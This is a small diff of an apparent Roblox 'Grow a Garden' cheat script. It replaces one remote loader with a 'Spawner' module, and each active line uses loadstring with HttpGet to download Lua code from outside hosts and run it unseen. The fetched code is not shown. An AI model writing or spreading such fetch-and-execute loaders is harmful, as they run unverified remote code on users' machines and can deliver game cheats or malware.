@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
 task.wait(1)
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/OYbW5kbveZ8sM1FO/raw", true))()
